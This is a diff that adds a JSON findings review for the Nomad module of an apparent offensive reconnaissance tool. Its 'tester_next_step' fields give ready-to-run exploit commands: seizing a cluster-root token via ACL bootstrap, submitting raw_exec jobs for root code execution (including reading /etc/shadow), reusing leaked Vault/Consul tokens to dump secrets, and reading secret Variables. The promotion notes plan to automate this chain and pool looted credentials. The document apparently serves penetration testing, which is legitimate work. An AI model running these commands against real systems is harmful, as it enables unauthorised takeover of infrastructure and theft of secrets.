@@ -1,0 +1,91 @@
+{
+  "service": "nomad",
+  "summary": "Best-in-tranche for T3 promotions: already attempts /v1/acl/bootstrap when reads are gated (which yields a management token if the cluster was never bootstrapped), extracts Vault/Consul integration tokens from /v1/agent/self, enumerates /v1/vars values, and probes /v1/jobs/parse for writable API. Missing: doesn't chain the bootstrap-token or leaked Vault/Consul token into the corresponding vault/consul modules automatically, and doesn't attempt raw_exec job registration.",
+  "module_files": [
+    "/home/kali/Desktop/projects/recce/recce/services/nomad.py"
+  ],
+  "findings": [
+    {
+      "kind": "nomad_unauth_read",
+      "title_pattern": "Nomad unauthenticated cluster read (ACLs disabled)",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "acl.enabled=false AND jobs/allocations/nodes read = deterministic anon-read.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Follow-on already covered by nomad_job_submit_rce and nomad_job_spec_secrets \u2014 chain into raw_exec-driver job registration for RCE on client nodes.",
+      "promotion_risk": "high",
+      "tester_next_step": "curl -sX POST http://<ip>:4646/v1/jobs -d @rawexec-job.json \u2014 with driver=raw_exec and command=/bin/id \u2014 runs as root on a client node."
+    },
+    {
+      "kind": "nomad_authed",
+      "title_pattern": "Nomad endpoint reachable (ACL enforcing)",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Fingerprint only.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Already covered \u2014 the module falls back to bootstrap probe when reads are gated.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sX POST http://<ip>:4646/v1/acl/bootstrap \u2014 if 200, cluster management token in response."
+    },
+    {
+      "kind": "nomad_acl_bootstrap_available",
+      "title_pattern": "Nomad ACL system un-bootstrapped \u2014 cluster-root token obtained",
+      "severity": "critical",
+      "tier": "t3",
+      "tier_evidence": "POST /v1/acl/bootstrap returned 200 with a real SecretID \u2014 cluster-root token captured in-module.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Chain to nomad_job_submit_rce for actual code-exec on any client (raw_exec/exec/docker driver). Auto-register a canary job, capture stdout, terminate the job.",
+      "promotion_risk": "high",
+      "tester_next_step": "Use captured SecretID: X-Nomad-Token: <token> to POST a raw_exec job that runs `id;hostname;cat /etc/shadow` on the client \u2014 full node compromise."
+    },
+    {
+      "kind": "nomad_integration_token_leak",
+      "title_pattern": "Nomad agent/self leaks Vault/Consul integration tokens",
+      "severity": "critical",
+      "tier": "t3",
+      "tier_evidence": "Actual Vault/Consul tokens returned in-clear from /v1/agent/self and captured \u2014 reusable credentials.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Feed the Vault token into vault module (vault kv list, vault kv get) and Consul token into consul module \u2014 full cross-service pivot. Wire into known_creds keyed by (service, address).",
+      "promotion_risk": "low",
+      "tester_next_step": "VAULT_ADDR=<leaked_addr> VAULT_TOKEN=<leaked_tok> vault kv list secret/; CONSUL_HTTP_ADDR=<leaked_addr> CONSUL_HTTP_TOKEN=<leaked_tok> consul kv get -recurse"
+    },
+    {
+      "kind": "nomad_job_spec_secrets",
+      "title_pattern": "Nomad job specs disclose task Env / Templates / Vault refs",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "Env keys and Template destinations enumerated from anon /v1/job/:id \u2014 key names not values; recce doesn't decode template contents.",
+      "can_promote_to": "t3",
+      "promotion_notes": "For each env, capture the VALUE (t.Env is already a k/v dict \u2014 module drops values, keeps keys only). Fix: capture matching values like docker_env_secrets does. Also GET rendered templates from allocation FS via /v1/client/fs/cat.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -s http://<ip>:4646/v1/job/<id> | jq -r '.TaskGroups[].Tasks[] | .Env' \u2014 env values in clear; curl http://<ip>:4646/v1/client/fs/cat/<allocid>?path=secrets/env \u2014 rendered template with real secrets."
+    },
+    {
+      "kind": "nomad_job_submit_rce",
+      "title_pattern": "Nomad HCL parse endpoint accepts anonymous submissions",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "POST /v1/jobs/parse returning 200 proves the parse route is anon-reachable; actual job registration and command execution not attempted.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Full chain: POST /v1/jobs with a raw_exec/exec job that runs id;hostname;whoami and reads stdout via /v1/client/fs/logs. Intrusive but non-destructive if scoped and torn down.",
+      "promotion_risk": "high",
+      "tester_next_step": "cat > job.json <<'EOF' {\"Job\":{\"ID\":\"pwn\",\"Type\":\"batch\",\"Datacenters\":[\"dc1\"],\"TaskGroups\":[{\"Name\":\"g\",\"Tasks\":[{\"Name\":\"t\",\"Driver\":\"raw_exec\",\"Config\":{\"command\":\"/bin/sh\",\"args\":[\"-c\",\"id>/tmp/pwn\"]}}]}]}} EOF; curl -X POST http://<ip>:4646/v1/jobs -d @job.json"
+    },
+    {
+      "kind": "nomad_variables_readable",
+      "title_pattern": "Nomad Variables secret store readable",
+      "severity": "critical",
+      "tier": "t3",
+      "tier_evidence": "GET /v1/var/:path returns cleartext Items and recce captures the key names + values_readable flag \u2014 actual secret material in hand (though only keys, not values, are captured).",
+      "can_promote_to": "t3",
+      "promotion_notes": "Already T3; small polish would capture the VALUE bytes not just the key names so shared known_creds can pool them.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -s http://<ip>:4646/v1/vars | jq -r '.[].Path' | while read p; do curl -s \"http://<ip>:4646/v1/var/$p\" | jq .Items; done"
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_creds (Vault/Consul integration tokens, job env values, Variables values)",
+    "known_hosts (nodes, allocations)",
+    "vault/consul module cross-invocation with looted tokens"
+  ]
+}
